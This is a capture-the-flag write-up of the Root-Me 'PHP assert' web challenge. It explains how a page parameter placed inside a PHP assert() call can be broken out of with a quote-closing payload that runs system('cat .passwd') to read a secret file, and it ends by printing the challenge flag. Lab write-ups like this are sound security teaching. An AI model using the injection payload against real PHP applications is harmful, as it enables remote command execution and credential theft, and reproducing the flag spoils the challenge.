# [PHP assert](https://www.root-me.org/en/Challenges/Web-Server/PHP-assert)

So we see the three links that change the url to `?page=home`

So let's just try something: `?page=admin`

We get an error: "'includes/admin.php' File doesn't exist!"

So it takes whatever is passed to `page` and searches for a PHP file with that 
name in the `includes/` directory.

We are trying to read the `.passwd` file. Let's try: `?page=../.passwd`

> Warning: assert(): Assertion "strpos('includes/../.passwd.php', '..') === false" failed 
> in /challenge/web-serveur/ch47/index.php on line 8 Detected hacking attempt!

So the backend is checking for directory traversal. But is it sanitizing our input to make 
sure we don't control the result of that if statement?

What if were somehow able to get the contents of `.passwd` in the error message?

`?page=','a') === false and system('cat .passwd') and strpos('`

This would make the `assert()` call look like this:

`assert(strpos('includes/','a') === false and system('cat .passwd') and strpos('.php','..') === false)`

The result of the `assert()` would be true because all three conditionals return true.

And the contents of `.passwd` get written to the screen before our "File doesn't exist" output.

Flag is: **x4Ss3rT1nglSn0ts4f3A7A1Lx**

















